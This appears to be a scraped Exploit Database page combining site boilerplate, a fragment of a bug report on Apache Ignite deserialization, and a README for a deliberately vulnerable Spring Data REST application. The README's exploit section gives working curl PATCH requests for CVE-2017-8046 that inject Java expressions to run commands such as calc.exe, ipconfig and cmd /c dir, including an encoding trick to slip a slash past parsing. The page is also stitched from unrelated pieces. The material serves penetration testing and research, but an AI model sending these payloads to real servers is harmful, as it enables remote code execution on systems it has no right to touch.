##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

| [Description](show_bug.cgi?id=1563133#c0)  Andrej Nemec    2018-04-03 08:51:28 UTC  ```  Apache Ignite serialization mechanism does not have a list of classes allowed for serialization/deserialization, which makes it possible to run arbitrary code when 3-rd party vulnerable classes are present in Ignite classpath. The vulnerability can be exploited if the one sends a specially prepared form of a serialized object to one of the deserialization endpoints of some Ignite components -  discovery SPI, Ignite persistence, Memcached endpoint, socket steamer.

Please be sure to select a version of Spring REST Data which is not affected by this issue.

# Spring Break Vulnerable Application

This is a vulnerable application to test the exploit for the **Spring Break** vulnerability (**CVE-2017-8046**).

## WARNING!

**This application contains serious security vulnerabilities. Run it at your own risk! It is recommended using a backed-up and sheltered environment (such as a VM with a recent snapshot and host-only networking). Do not upload this application to any Internet facing servers, as they will be compromised.**

***DISCLAIMER*: I do not take responsibility for the way in which any one uses this application (SpringBreakVulnerableApp). The only purpose of this application is to be a test scenario for the Spring Break exploit and it should not be used maliciously. If your server is compromised via an installation of SpringBreakVulnerableApp it is not my responsibility, it is the responsibility of the person(s) who uploaded and installed it.**

## Vulnerability info

* **CVE-ID**: CVE-2017-8046
* **Link**: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8046>
* **Description**: Malicious *PATCH* requests submitted to *spring-data-rest* servers in **Pivotal Spring Data REST** versions prior to **2.5.12**, **2.6.7**, **3.0 RC3**, **Spring Boot** versions prior to **2.0.0M4**, and **Spring Data** release trains prior to **Kay-RC3** can use specially crafted JSON data to run arbitrary Java code.

## Usage

The application can be launched with the following Maven command.

```
mvn spring-boot:run

```

A fat jar can be generated with the following Maven command.

```
mvn clean install spring-boot:repackage

```

To insert data you can use the following curl command.

```
curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://hostname:port/entity

```

## Exploit

Probably the simplest exploit is the following request.

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Thread).sleep(10000).x", "value" : "pwned" }]' "http://hostname:port/entity/1"

```

On Windows, the `calc.exe` process can be launched with the following request. Similar requests can be used to launch arbitrary commands.

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x", "value" : "pwned" }]' "http://hostname:port/entity/1/"

```

To obtain the output of launched commands, some "gadgets" offered by Spring Framework code can be used. Luckily, no external dependencies are required. For example, the result of `ipconfig` command can be retrieved with the following request.

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"

```

On Windows, a `cmd /c dir` command, and other similar commands, can be launched with the following request. Please note the trick used to insert the slash char avoiding the explicit value (i.e. explicit slashes are replaced with dots befor the real parsing).

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"cmd \" + T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F)) + \"c dir\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"

```
